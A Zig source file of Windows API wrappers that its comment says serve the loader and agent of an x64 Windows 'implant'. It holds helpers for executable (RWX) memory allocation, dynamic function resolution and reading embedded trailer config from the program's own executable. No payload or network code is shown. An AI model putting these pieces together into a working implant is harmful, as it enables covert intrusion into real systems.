//! Minimal Windows API externs used by the loader and the agent.
//! Windows-only by design (the implant is x64 Windows).

const windows = std.os.windows;
const std = @import("std");

pub const HMODULE = ?*anyopaque;
pub const FARPROC = ?*const anyopaque;

// --- Memory ---
pub const MEM_COMMIT: u32 = 0x00001000;
pub const MEM_RESERVE: u32 = 0x00002000;
pub const MEM_RELEASE: u32 = 0x00008000;
pub const PAGE_EXECUTE_READWRITE: u32 = 0x40;
pub const PAGE_READWRITE: u32 = 0x04;

extern "kernel32" fn VirtualAlloc(
    addr: ?*anyopaque,
    size: usize,
    allocation_type: u32,
    protect: u32,
) ?*anyopaque;
extern "kernel32" fn VirtualFree(addr: *anyopaque, size: usize, free_type: u32) i32;

pub fn virtualAlloc(size: usize, protect: u32) ?[*]u8 {
    const p = VirtualAlloc(null, size, MEM_COMMIT | MEM_RESERVE, protect);
    return if (p) |pp| @ptrCast(pp) else null;
}

pub fn virtualFree(base: [*]u8) void {
    _ = VirtualFree(@ptrCast(base), 0, MEM_RELEASE);
}

// --- Library loader ---
extern "kernel32" fn LoadLibraryA(name: [*:0]const u8) HMODULE;
extern "kernel32" fn GetProcAddress(h: HMODULE, name: [*:0]const u8) ?*anyopaque;
extern "kernel32" fn GetModuleFileNameA(h: HMODULE, out: [*]u8, len: u32) u32;
extern "kernel32" fn GetCommandLineA() [*:0]u8;

pub const HANDLE = ?*anyopaque;
const GENERIC_READ: u32 = 0x80000000;
const FILE_SHARE_READ: u32 = 1;
const OPEN_EXISTING: u32 = 3;
const FILE_BEGIN: u32 = 0;
const INVALID_HANDLE_VALUE: HANDLE = @ptrFromInt(@as(usize, std.math.maxInt(usize)));

extern "kernel32" fn CreateFileA(
    name: [*:0]const u8,
    access: u32,
    share: u32,
    sa: ?*anyopaque,
    disp: u32,
    flags: u32,
    template: HANDLE,
) HANDLE;
extern "kernel32" fn ReadFile(h: HANDLE, buf: [*]u8, len: u32, read: *u32, ov: ?*anyopaque) i32;
extern "kernel32" fn GetFileSizeEx(h: HANDLE, size: *i64) i32;
extern "kernel32" fn SetFilePointerEx(h: HANDLE, dist: i64, newpos: ?*i64, method: u32) i32;
extern "kernel32" fn CloseHandle(h: HANDLE) i32;

/// Get the path of this process's own exe (hModule = NULL). Avoids the
/// experimental std.Io dependency that 0.16's `std.process.executablePathAlloc`
/// requires. Returns a sentinel-terminated slice into `buf`.
pub fn selfExePath(buf: []u8) ?[:0]u8 {
    const n = GetModuleFileNameA(null, buf.ptr, @intCast(buf.len));
    if (n == 0) return null;
    return buf[0..n :0];
}

/// Raw command line (ANSI). `std.process.argsAlloc` was removed in 0.16, so we
/// go straight to GetCommandLineA. Caller parses.
pub fn commandLine() [:0]const u8 {
    const p = GetCommandLineA();
    const len = std.mem.indexOfSentinel(u8, 0, p);
    return p[0..len :0];
}

/// Read a file fully into an owned slice (caller frees with `alloc`).
pub fn readFile(alloc: std.mem.Allocator, path: [:0]const u8) ?[]u8 {
    const h = CreateFileA(path.ptr, GENERIC_READ, FILE_SHARE_READ, null, OPEN_EXISTING, 0, null);
    if (h == INVALID_HANDLE_VALUE or h == null) return null;
    defer _ = CloseHandle(h);

    var size_i: i64 = 0;
    if (GetFileSizeEx(h, &size_i) == 0) return null;
    const len: usize = @intCast(size_i);
    const buf = alloc.alloc(u8, len) catch return null;
    var got: u32 = 0;
    if (ReadFile(h, buf.ptr, @intCast(len), &got, null) == 0 or got != len) {
        alloc.free(buf);
        return null;
    }
    return buf;
}

/// Read the last `window` bytes of this process's own exe (for trailer config).
/// Returns an owned slice (caller frees with `alloc`) or null.
pub fn readSelfExeTail(alloc: std.mem.Allocator, window: usize) ?[]u8 {
    var path_buf: [1024]u8 = undefined;
    const path = selfExePath(&path_buf) orelse return null;

    const h = CreateFileA(path.ptr, GENERIC_READ, FILE_SHARE_READ, null, OPEN_EXISTING, 0, null);
    if (h == INVALID_HANDLE_VALUE or h == null) return null;
    defer _ = CloseHandle(h);

    var size_i: i64 = 0;
    if (GetFileSizeEx(h, &size_i) == 0) return null;
    const len: u64 = @intCast(size_i);
    if (len == 0) return null;

    const start: u64 = if (len > window) len - window else 0;
    if (SetFilePointerEx(h, @intCast(start), null, FILE_BEGIN) == 0) return null;

    const tail_len: usize = @intCast(len - start);
    const tail = alloc.alloc(u8, tail_len) catch return null;
    var got: u32 = 0;
    if (ReadFile(h, tail.ptr, @intCast(tail_len), &got, null) == 0) {
        alloc.free(tail);
        return null;
    }
    if (got != tail_len) {
        alloc.free(tail);
        return null;
    }
    return tail;
}

/// Load `lib` (e.g. "kernel32.dll") and resolve `func`. Returns the function
/// address, trying a leading-underscore decoration if the plain name misses
/// (some imports are decorated).
pub fn procAddr(lib: []const u8, func: []const u8) ?usize {
    var lib_buf: [256]u8 = undefined;
    if (lib.len >= lib_buf.len) return null;
    @memcpy(lib_buf[0..lib.len], lib);
    lib_buf[lib.len] = 0;
    const lib_c: [*:0]const u8 = lib_buf[0..lib.len :0];

    const h = LoadLibraryA(lib_c);
    if (h == null) return null;

    var func_buf: [256]u8 = undefined;
    if (func.len >= func_buf.len) return null;
    @memcpy(func_buf[0..func.len], func);
    func_buf[func.len] = 0;
    const func_c: [*:0]const u8 = func_buf[0..func.len :0];
    if (GetProcAddress(h, func_c)) |p| return @intFromPtr(p);

    // Try a leading underscore (some imports are decorated).
    if (func.len > 0 and func[0] != '_') {
        func_buf[0] = '_';
        @memcpy(func_buf[1 .. 1 + func.len], func);
        func_buf[1 + func.len] = 0;
        const dec_c: [*:0]const u8 = func_buf[0 .. 1 + func.len :0];
        if (GetProcAddress(h, dec_c)) |p| return @intFromPtr(p);
    }
    return null;
}
